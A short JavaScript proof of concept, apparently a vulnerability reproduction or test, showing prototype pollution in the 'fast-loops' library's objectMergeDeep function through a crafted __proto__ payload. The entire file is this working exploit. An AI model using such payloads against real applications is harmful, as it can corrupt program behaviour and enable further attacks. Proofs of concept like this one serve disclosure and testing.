const fl = require('fast-loops');

let payload = { ["__proto__"]: { "toString": "polluted" } };

fl.objectMergeDeep({}, payload);

if (({}).toString == "polluted")
  throw Error("I pollute");
